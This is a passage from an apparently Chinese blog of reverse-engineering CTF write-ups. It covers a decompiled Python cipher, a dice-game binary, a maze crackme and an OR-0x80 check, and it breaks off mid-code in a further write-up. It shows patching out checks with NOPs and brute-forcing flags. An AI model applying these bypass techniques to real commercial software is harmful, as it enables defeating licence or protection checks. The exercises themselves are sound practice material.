md5(str(datetime.now().microsecond).encode(&apos;utf-8&apos;)).hexdigest()[-ckey_length:]</span><br><span class="line">    else:</span><br><span class="line">        return</span><br><span class="line">    cryptkey = keya + md5((keya + keyc).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    key_length = len(cryptkey)</span><br><span class="line">    if operation == &apos;DECODE&apos;:</span><br><span class="line">        string = base64.b64decode(string[ckey_length:])</span><br><span class="line">    elif operation == &apos;ENCODE&apos;:</span><br><span class="line">        if expiry == 0:</span><br><span class="line">            string = &apos;0000000000&apos; + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string</span><br><span class="line">        else:</span><br><span class="line">            string = &apos;%10d&apos; % (expiry + int(time())) + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string</span><br><span class="line">    else:</span><br><span class="line">        return</span><br><span class="line">    string_length = len(string)</span><br><span class="line">    result = &apos;&apos;</span><br><span class="line">    box = range(256)</span><br><span class="line">    rndkey = [0] * 256</span><br><span class="line">    for i in range(256):</span><br><span class="line">        rndkey[i] = ord(cryptkey[i % key_length])</span><br><span class="line"></span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + box[i] + rndkey[i]) % 256</span><br><span class="line">        tmp = box[i]</span><br><span class="line">        box[i] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line"></span><br><span class="line">    a = j = 0</span><br><span class="line">    for i in range(string_length):</span><br><span class="line">        a = (a + 1) % 256</span><br><span class="line">        j = (j + box[a]) % 256</span><br><span class="line">        tmp = box[a]</span><br><span class="line">        box[a] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">        result += chr(ord(string[i]) ^ box[(box[a] + box[j]) % 256])</span><br><span class="line"></span><br><span class="line">    if operation == &apos;DECODE&apos;:</span><br><span class="line">        if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0:</span><br><span class="line">            if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]:</span><br><span class="line">                return result[26:]</span><br><span class="line">            else:</span><br><span class="line">                return &apos;&apos;</span><br><span class="line">        else:</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">    else:</span><br><span class="line">        return keyc + base64.b64encode(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        exit(1)</span><br><span class="line">    ex = 20</span><br><span class="line">    for i in range(1, len(sys.argv), 2):</span><br><span class="line">        a = sys.argv[i]</span><br><span class="line">        b = sys.argv[i + 1]</span><br><span class="line">        if a == &apos;-t&apos;:</span><br><span class="line">            ex = int(b)</span><br><span class="line">        elif a == &apos;-e&apos;:</span><br><span class="line">            encoded = authcode(b, &apos;ENCODE&apos;, expiry=ex)</span><br><span class="line">            print encoded</span><br><span class="line">        elif a == &apos;-d&apos;:</span><br><span class="line">            decoded = authcode(b, &apos;DECODE&apos;, expiry=ex)</span><br><span class="line">            print decoded</span><br><span class="line"># okay decompyling reverse300.pyc </span><br><span class="line"># decompiled 1 files: 1 okay, 0 failed, 0 verify failed</span><br><span class="line"># 2018.10.23 17:05:34 CST</span><br></pre></td></tr></table></figure>
<p>要求是输入至少3个参数，第一个输入-d的话就是解密，第二个参数就输入题目给的字符串就行了，不知道第三个参数该输入啥，直接把<code>if len(sys.argv) &lt; 3:
        exit(1)</code>给nop掉了。</p>
<p>运行发现程序没有结果，可能是解密函数出了一些问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if operation == &apos;DECODE&apos;:</span><br><span class="line">    if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0:</span><br><span class="line">        if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]:</span><br><span class="line">            return result[26:]</span><br><span class="line">        else:</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">    else:</span><br><span class="line">        return &apos;&apos;</span><br><span class="line">else:</span><br><span class="line">    return keyc + base64.b64encode(result)</span><br></pre></td></tr></table></figure>
<p>最里面的return result[26:]可能就是正确结果，把所有return替换成这个之后运行得到flag。</p>
<h1 id="Keylead（ASIS-CTF-2015）"><a href="#Keylead（ASIS-CTF-2015）" class="headerlink" title="Keylead（ASIS CTF 2015）"></a>Keylead（ASIS CTF 2015）</h1><p>下载下来是个7z文件，后缀改为7z解压后用ida打开，从主函数发现是一个掷🎲小游戏，和上一篇里的🎲要求掷的数字也是一样的，不过这个要用gdb调试，无奈gdb鶸，只能用ida看看输出flag的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line">  v11 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  while ( v11 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    putchar(byte_601680[14 * v11++]);</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      while ( v7 &lt;= 1 )</span><br><span class="line">        putchar(byte_601680[20 * v11 - 8 * v7++]);</span><br><span class="line">      v1 = v7 + 1;</span><br><span class="line">      v2 = 3 * v11;</span><br><span class="line">      putchar(byte_601680[2 * v2 + 11 + v1]);</span><br><span class="line">      v2 *= 5;</span><br><span class="line">      v8 = v1 - 1;</span><br><span class="line">      putchar(byte_601680[2 * v2 + v8]);</span><br><span class="line">      v12 = v2 / 3;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">          if ( !v8 )</span><br><span class="line">          &#123;</span><br><span class="line">            putchar(byte_601680[2 * v12]);</span><br><span class="line">            v15 = v12 ^ 2;</span><br><span class="line">            while ( 2 )</span><br><span class="line">            &#123;</span><br><span class="line">              for ( i = 1; i &lt;= 9; ++i )</span><br><span class="line">                putchar(byte_601680[10 * (i % 2) + 3 + v15]);</span><br><span class="line">              v13 = v15 + 1;</span><br><span class="line">LABEL_44:</span><br><span class="line">              putchar(byte_601680[v13 / 3]);</span><br><span class="line">              if ( i == 10 )</span><br><span class="line">              &#123;</span><br><span class="line">                v13 += 2 * v13 + 13;</span><br><span class="line">                i = 19;</span><br><span class="line">                goto LABEL_33;</span><br><span class="line">              &#125;</span><br><span class="line">              if ( i == 2 )</span><br><span class="line">              &#123;</span><br><span class="line">                i = v13-- + 2;</span><br><span class="line">                goto LABEL_4;</span><br><span class="line">              &#125;</span><br><span class="line">              if ( (unsigned int)(i - 22) &lt;= 0xA )</span><br><span class="line">              &#123;</span><br><span class="line">                v14 = v13 - 3;</span><br><span class="line">                for ( j = i - v14; ; j = 8 )</span><br><span class="line">                &#123;</span><br><span class="line">LABEL_58:</span><br><span class="line">                  putchar(byte_601680[v14 + 1]);</span><br><span class="line">                  v16 = v14 + 1;</span><br><span class="line">                  if ( j == 11 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v13 = (v16 + 14) / 2;</span><br><span class="line">                    i = 11 * (v13 / 6);</span><br><span class="line">                    goto LABEL_44;</span><br><span class="line">                  &#125;</span><br><span class="line">                  if ( j != 13 )</span><br><span class="line">                    break;</span><br><span class="line">                  v12 = v16 + 8;</span><br><span class="line">                  v8 = 2;</span><br><span class="line">LABEL_51:</span><br><span class="line">                  while ( 2 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    putchar(byte_601680[v12 - 10]);</span><br><span class="line">                    if ( v8 == v12 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v4 = v8 + 2;</span><br><span class="line">                      v5 = v12 + 2;</span><br><span class="line">                      putchar(byte_601680[v5 / 2 + v4 / 5]);</span><br><span class="line">                      i = v4 / 2;</span><br><span class="line">                      putchar(byte_601680[i / 5 + v5]);</span><br><span class="line">                      v13 = v5 + i - 1 + v5;</span><br><span class="line">                      while ( 1 )</span><br><span class="line">                      &#123;</span><br><span class="line">LABEL_33:</span><br><span class="line">                        putchar(byte_601680[v13 - 19]);</span><br><span class="line">                        if ( i == 2 )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v3 = v13 + 1;</span><br><span class="line">                          putchar(byte_601680[v3 / 2 - 3]);</span><br><span class="line">                          v13 = v3 / 5 + 2;</span><br><span class="line">                          i = 2;</span><br><span class="line">                          goto LABEL_44;</span><br><span class="line">                        &#125;</span><br><span class="line">                        if ( i &lt;= 2 )</span><br><span class="line">                          break;</span><br><span class="line">                        if ( i == 10 )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v12 = v13 - 31;</span><br><span class="line">                          v8 = 9;</span><br><span class="line">                          goto LABEL_51;</span><br><span class="line">                        &#125;</span><br><span class="line">                        if ( i != 19 )</span><br><span class="line">                          goto LABEL_44;</span><br><span class="line">                        i = 2;</span><br><span class="line">                      &#125;</span><br><span class="line">                      if ( i == 1 )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v8 = 17;</span><br><span class="line">                        v12 = v13 % 5 - 17 + v13;</span><br><span class="line">LABEL_20:</span><br><span class="line">                        putchar(byte_601680[v12 - v8 + 9]);</span><br><span class="line">                        v12 += ~v8++;</span><br><span class="line">                        continue;</span><br><span class="line">                      &#125;</span><br><span class="line">                      goto LABEL_44;</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                  &#125;</span><br><span class="line">                  if ( v8 != 9 )</span><br><span class="line">                  &#123;</span><br><span class="line">                    if ( v8 != 2 )</span><br><span class="line">                      goto LABEL_12;</span><br><span class="line">                    j = 2;</span><br><span class="line">                    v16 = v12 - 18;</span><br><span class="line">LABEL_64:</span><br><span class="line">                    v6 = 9 * j;</span><br><span class="line">                    putchar(byte_601680[v16 / 2 + v6 + v6 % 10]);</span><br><span class="line">                    v11 = v16 + 1;</span><br><span class="line">                    v7 = v6 % 10;</span><br><span class="line">                    goto LABEL_21;</span><br><span class="line">                  &#125;</span><br><span class="line">                  putchar(byte_601680[v12 - 16]);</span><br><span class="line">                  v14 = v12 / 2;</span><br><span class="line">                &#125;</span><br><span class="line">                if ( j == 8 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v15 = v16 + 1;</span><br><span class="line">                  i = 7;</span><br><span class="line">                  continue;</span><br><span class="line">                &#125;</span><br><span class="line">                goto LABEL_64;</span><br><span class="line">              &#125;</span><br><span class="line">              goto LABEL_4;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v8 == 2 )</span><br><span class="line">            break;</span><br><span class="line">          if ( v12 == 7 )</span><br><span class="line">          &#123;</span><br><span class="line">            putchar(byte_601680[21 - v8]);</span><br><span class="line">            v13 = 49;</span><br><span class="line">            i = v8 / 3;</span><br><span class="line">            goto LABEL_33;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( v8 != 3 )</span><br><span class="line">            goto LABEL_20;</span><br><span class="line">          putchar(byte_601680[2 * (v12 / 3)]);</span><br><span class="line">          v13 = v12 / 3;</span><br><span class="line">          i = 9;</span><br><span class="line">          do</span><br><span class="line">          &#123;</span><br><span class="line">            while ( 1 )</span><br><span class="line">            &#123;</span><br><span class="line">              if ( v13 == 10 )</span><br><span class="line">              &#123;</span><br><span class="line">                putchar(byte_601680[i + 8]);</span><br><span class="line">                v14 = 9;</span><br><span class="line">                j = i + 1;</span><br><span class="line">                goto LABEL_58;</span><br><span class="line">              &#125;</span><br><span class="line">              if ( v13 == 11 )</span><br><span class="line">              &#123;</span><br><span class="line">                putchar(byte_601680[i / 7]);</span><br><span class="line">                v13 = i-- - 11;</span><br><span class="line">              &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">              if ( i != 9 )</span><br><span class="line">                break;</span><br><span class="line">              putchar(byte_601680[v13 * v13 + 7]);</span><br><span class="line">              v13 = v13 * v13 + 1;</span><br><span class="line">              i = 10;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          while ( i != 13 );</span><br><span class="line">          putchar(byte_601680[2 * v13 + 12]);</span><br><span class="line">          v8 = 3;</span><br><span class="line">          v12 = 3 * v13;</span><br><span class="line">        &#125;</span><br><span class="line">        putchar(byte_601680[3 * v12 + 1]);</span><br><span class="line">        v0 = v12 * v12;</span><br><span class="line">        putchar(byte_601680[v0 - 15]);</span><br><span class="line">        v11 = v0 - 15;</span><br><span class="line">        v7 = 4;</span><br><span class="line">        putchar(byte_601680[4]);</span><br><span class="line">LABEL_21:</span><br><span class="line">        if ( v7 != 4 )</span><br><span class="line">          break;</span><br><span class="line">        putchar(byte_601680[v11 + 6]);</span><br><span class="line">        v12 = v11 - 3;</span><br><span class="line">        v8 = 3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v7 != 8 );</span><br><span class="line">    putchar(byte_601680[2 * v11 + 32]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>…有点烦，还是先学习下gdb吧。</p>
<p>学习后发现用ida远程调试就可以了，并不一定要用gdb，调试时把所有跳转到失败情况的jle之类的nop掉，这样运行到最后就会输出flag了。</p>
<h1 id="分道扬镳"><a href="#分道扬镳" class="headerlink" title="分道扬镳"></a>分道扬镳</h1><p>题目说是一个迷宫，ida打开，用字符串查看地图：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">********</span><br><span class="line">* *    *</span><br><span class="line">* * ** *</span><br><span class="line">* * ** *</span><br><span class="line">* * #* *</span><br><span class="line">* **** *</span><br><span class="line">*      *</span><br><span class="line">********</span><br></pre></td></tr></table></figure>
<p>找到调用这个地图的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">  v5 = 0;</span><br><span class="line">  memset(&amp;v6, 0, 0x74u);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  strcpy(&amp;v2, &quot;********* *    ** * ** ** * ** ** * #* ** **** **      *********&quot;);</span><br><span class="line">  v1 = &amp;v3;</span><br><span class="line">  printf(&quot;Please input your key:\n&quot;);</span><br><span class="line">  gets(&amp;v5);</span><br><span class="line">  if ( strlen(&amp;v5) != 22 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = *(&amp;v5 + v11);</span><br><span class="line">    if ( v10 != &apos;k&apos; &amp;&amp; v10 != &apos;j&apos; &amp;&amp; v10 != &apos;h&apos; &amp;&amp; v10 != &apos;l&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">      system(&quot;pause&quot;);</span><br><span class="line">      exit(2);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = *(&amp;v5 + v11);</span><br><span class="line">    switch ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      case &apos;h&apos;:</span><br><span class="line">        if ( --v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || (result = (char *)*v1, result == (char *)&apos;*&apos;) )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(3);</span><br><span class="line">        &#125;</span><br><span class="line">        if ( *v1 == &apos;#&apos; )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_41:</span><br><span class="line">          printf(&quot;Good!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;j&apos;:</span><br><span class="line">        v1 += 8;</span><br><span class="line">        if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(3);</span><br><span class="line">        &#125;</span><br><span class="line">        result = (char *)*v1;</span><br><span class="line">        if ( result == (char *)&apos;#&apos; )</span><br><span class="line">          goto LABEL_41;</span><br><span class="line">        break;</span><br><span class="line">      case &apos;k&apos;:</span><br><span class="line">        v1 -= 8;</span><br><span class="line">        if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(3);</span><br><span class="line">        &#125;</span><br><span class="line">        result = v1;</span><br><span class="line">        if ( *v1 == &apos;#&apos; )</span><br><span class="line">          goto LABEL_41;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        if ( ++v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Sorry you are wrong!\n&quot;);</span><br><span class="line">          system(&quot;pause&quot;);</span><br><span class="line">          exit(4);</span><br><span class="line">        &#125;</span><br><span class="line">        result = v1;</span><br><span class="line">        if ( *v1 == &apos;#&apos; )</span><br><span class="line">          goto LABEL_41;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v11;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v11 &lt; 25 );</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
<p>分析得j是向下，k是向上，h向左，l向右，不能走到*上，走到#就走出了迷宫，结合地图得到答案。</p>
<h1 id="10000000"><a href="#10000000" class="headerlink" title="10000000"></a>10000000</h1><p>ida打开，main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__main();</span><br><span class="line">v17 = 0;</span><br><span class="line">memset(&amp;v18, 0, 0x10u);</span><br><span class="line">memset(&amp;v4, 0, 0x14u);</span><br><span class="line">v4 = -26;</span><br><span class="line">v5 = -20;</span><br><span class="line">v6 = -31;</span><br><span class="line">v7 = -25;</span><br><span class="line">v8 = -70;</span><br><span class="line">v9 = -12;</span><br><span class="line">v10 = -27;</span><br><span class="line">v11 = -13;</span><br><span class="line">v12 = -12;</span><br><span class="line">v13 = -12;</span><br><span class="line">v14 = -27;</span><br><span class="line">v15 = -13;</span><br><span class="line">v16 = -12;</span><br><span class="line">v19 = 0;</span><br><span class="line">puts(asc_403024);</span><br><span class="line">scanf(&quot;%s&quot;, &amp;v17);</span><br><span class="line">LOBYTE(v19) = 0;</span><br><span class="line">while ( *((_BYTE *)&amp;v17 + v19) )</span><br><span class="line">  *((_BYTE *)&amp;v17 + v19++) |= 0x80u;</span><br><span class="line">if ( !strcmp((const char *)&amp;v17, &amp;v4) )</span><br><span class="line">  printf(&quot;good&quot;);</span><br><span class="line">else</span><br><span class="line">  printf(&quot;wrong&quot;);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure>
<p>逻辑很简单，输入|=0x80后与v4相等就ok了，不过不清楚|可不可以逆运算，来一发爆破吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">v4=[0xe6,0xec,0xe1,0xe7,0xba,0xf4,0xe5,0xf3,0xf4,0xf4,0xe5,0xf3,0xf4]</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(len(v4)):</span><br><span class="line">  for j in string.printable:</span><br><span class="line">    if ord(j)|0x80==v4[i]:</span><br><span class="line">      flag+=j</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<p>需要注意的是ida打开时v4的值默认显示的是十进制负数……如果用这个来爆破是不会得到结果的，转换成十六进制后变成正数（鶸也不知道为啥），随后就可以得到flag了。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-实验吧-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/10/22/实验吧-1/" class="article-date">
      <time datetime="2018-10-22T14:37:21.000Z" itemprop="datePublished">2018-10-22</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/22/实验吧-1/">实验吧-1</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="证明自己吧"><a href="#证明自己吧" class="headerlink" title="证明自己吧"></a>证明自己吧</h1><p>ida打开，定位到关键函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">  v5 = dword_40708C;</span><br><span class="line">  v6 = dword_407090;</span><br><span class="line">  v8 = word_407098;</span><br><span class="line">  v9 = byte_40709A;</span><br><span class="line">  v7 = dword_407094;</span><br><span class="line">  if ( strlen(a1) == strlen((const char *)&amp;v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = 0;</span><br><span class="line">    if ( strlen(a1) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">        a1[v1++] ^= 0x20u;</span><br><span class="line">      while ( v1 &lt; strlen(a1) );</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = 0;</span><br><span class="line">    if ( strlen((const char *)&amp;v5) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">        *((_BYTE *)&amp;v5 + v2++) -= 5;</span><br><span class="line">      while ( v2 &lt; strlen((const char *)&amp;v5) 